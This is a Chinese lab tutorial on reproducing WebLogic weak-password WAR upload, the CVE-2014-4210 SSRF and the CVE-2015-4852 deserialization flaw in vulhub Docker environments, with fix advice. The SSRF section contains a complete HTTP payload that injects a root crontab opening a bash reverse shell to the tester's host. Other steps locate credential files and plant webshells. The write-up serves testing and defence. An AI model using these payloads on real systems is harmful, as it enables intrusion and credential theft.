### 0x00 WebLogic 介绍及常见漏洞

WebLogic 是由 Oracle 公司开发的一款基于 Java EE 架构的中间件，主要用于开发、集成、部署和管理大型分布式 Web 应用、网络应用和数据库应用。它将 Java 的动态功能和 Java Enterprise 标准的安全性引入大型网络应用的开发、集成、部署和管理之中。

WebLogic 常用端口为 7001 和 7002。常见的安全漏洞包括弱口令导致的任意 WAR 包上传、SSRF（服务器端请求伪造）漏洞以及反序列化漏洞。本文将利用 phith0n 提供的漏洞利用环境进行验证，并向其表示感谢。WebLogic 环境地址：[https://github.com/phith0n/vulhub/tree/master/weblogic](https://github.com/phith0n/vulhub/tree/master/weblogic)

### 0x01 WebLogic 弱口令导致上传并部署 WAR 包获取 WEBSHELL

通过利用 WebLogic 的弱口令登录后，可以上传 WAR 包以获取 WEBSHELL。

**步骤如下：**

1. 下载项目后进入 `/weblogic/weak_password` 目录。
2. 运行 `sudo docker-compose build` 进行编译（请参照 Docker 安装指南）。
3. 编译完成后，使用以下命令启动：
   ```bash
   fuping@ubuntu:~/Git/vulhub/weblogic/weak_password$ sudo docker-compose up -d # 启动
   fuping@ubuntu:~/Git/vulhub/weblogic/weak_password$ sudo docker ps # 查看启动的 Docker 容器
   ```
4. 访问 `http://192.168.232.137:7001` 并使用用户名 `weblogic` 和密码 `Oracle@123` 登录。
5. 上传 WAR 包的过程为：`域结构-部署-安装-上传文件-将此部署安装为应用程序`。然后访问项目名称即可。

如果不存在弱口令，可以通过其他漏洞（如任意文件读取漏洞）获取 `SerializedSystemIni.dat` 和 `config.xml` 文件，然后解密这些文件来获取密码信息。

**WebLogic 加密解密方式：**

- **AES 加密 (WebLogic 11gR1 及之后版本)**
  - 密码文件路径：`<安装目录>/user_projects/domains/base_domain/servers/AdminServer/security/boot.properties`
  - 示例路径：`/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/security/boot.properties`
  - 示例内容：
    ```plaintext
    username={AES}xdwPe62ds+jcPCQwwLn/VR3fI0e9ZGkFz96ZBqmvRpY=
    password={AES}dv/eNBsyg5GcDUbAKaQRheDZhzVk9yiTYVpXlGt9wEU=
    ```
  - 加密密钥保存在 `SerializedSystemIni.dat` 文件中，默认路径：`<安装目录>/user_projects/domains/base_domain/security/SerializedSystemIni.dat`
  - 示例路径：`/root/Oracle/Middleware/user_projects/domains/base_domain/security/SerializedSystemIni.dat`

- **DES 加密 (WebLogic 11gR1 之前版本)**
  - 密码文件路径：`<安装目录>/samples/domains/wl_server/security/boot.properties`
  - 示例内容：
    ```plaintext
    username={3DES}fy709SQ4pCHAFk+lIxiWfw==
    password={3DES}fy709SQ4pCHAFk+lIxiWfw==
    ```

### 0x02 WebLogic SSRF 漏洞

**漏洞编号：CVE-2014-4210**

**影响版本：** 10.0.2, 10.3.6

**漏洞描述：** Oracle WebLogic Web Server 允许外部主机访问，同时也允许访问内部主机。攻击者可以利用 `SearchPublicReqistries.jsp` 页面进行未经授权的 TCP 端口连接，从而探测内网服务。

**步骤如下：**

1. 进入 `/weblogic/ssrf` 目录。
2. 修改 `Dockerfile` 文件中的第六行 `&& yum update \` 为 `&& yum update -y \`，以避免编译错误。
3. 运行 `sudo docker-compose build` 进行编译。
4. 编译完成后，使用以下命令启动：
   ```bash
   fuping@ubuntu:~/Git/vulhub/weblogic/ssrf$ sudo docker-compose up -d # 启动
   fuping@ubuntu:~/Git/vulhub/weblogic/ssrf$ sudo docker ps # 查看启动的 Docker 容器
   ```
5. 利用脚本 [weblogic_ssrf.py](https://github.com/fupinglee/MyPython/blob/master/weblogic/weblogic_ssrf.py) 扫描内网开放端口的主机。
6. 在 Ubuntu 上执行 `nc -l -p 1234`，然后发送以下请求包：
   ```http
   GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://172.19.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20>%26%20%2Fdev%2Ftcp%2F192.168.232.137%2F1234%200>%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search HTTP/1.1
   Host: 192.168.232.137:7001
   User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
   Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
   Accept-Encoding: gzip, deflate
   Cookie: publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|; ADMINCONSOLESESSION=6L9hZ1GCsBrQWk49rcJ5K1zxygCPpysB4FrD8xk27XV50KzBh2rT!657144266; JSESSIONID=Q92gZ1fYpmLHP5yCxg4TpdjKCTTHhKTTZS1XKXTNDNf40R80H5J0!-1544297006
   Connection: close
   Upgrade-Insecure-Requests: 1
   ```

**修复建议：**

1. 如果业务不需要 UDDI 功能，关闭该功能。可以删除 `uddiexporer` 文件夹，或者在 `/weblogicPath/server/lib/uddiexplorer.war` 解压后注释掉相关 JSP 文件再重新打包。
2. 安装 Oracle 的更新包。

### 0x03 WebLogic 反序列化漏洞

**漏洞编号：CVE-2015-4852**

**影响版本：** 
- Oracle WebLogic Server 12.2.1.0
- Oracle WebLogic Server 12.1.3.0
- Oracle WebLogic Server 12.1.2.0
- Oracle WebLogic Server 10.3.6.0

**漏洞描述：** WLS Security 组件允许远程攻击者通过向 TCP 端口 7001 发送包含精心构造的序列化 Java 对象的 T3 协议流量，从而执行任意命令。此漏洞影响到 `oracle_common/modules/com.bea.core.apache.commons.collections.jar` 内的一个未知函数。

**步骤如下：**

1. 使用 WebLogic 反序列化工具进行验证（作者：rebeyond）。
2. 一般 web 项目位于 `/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/` 中。
3. 通过执行 `ls /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/` 查找可用目录。
4. 将 shell 文件上传到任意一个目录下的 WAR 文件中，例如：
   - `/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/1.txt`
   - `/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/uddiexplorer/5f6ebw/war/jspy.jsp`

**查找 WEB 绝对路径的方法：**

- **Linux：** 使用 `find -name *.jsp` 查找，例如已知 `hello` 项目中有 `file.jsp`，则查找命令为 `find -name file.jsp`。
- **Windows：** 使用 `for /r c:\ %i in (file*.jsp) do @echo %i`，也可以通过查看 `config/config.xml` 文件内容来确定 web 项目的绝对路径。

**修复建议：**

1. 过滤 T3 协议。
2. 安装补丁。

### 0x04 总结

本文主要介绍了如何利用 phith0n 提供的 WebLogic 漏洞利用环境来验证 WebLogic 的三种常见漏洞：弱口令导致的任意 WAR 包上传、SSRF 漏洞以及反序列化漏洞。具体问题总结如下：

1. 如何通过弱口令上传 WEBSHELL。
2. 如何利用 SSRF 漏洞探测内网存活的主机及其开放的端口。
3. 如何快速找到 WEB 路径及对应的物理路径，以便利用反序列化漏洞。

### 0x05 参考

1. [参考文献 1]
2. [参考文献 2]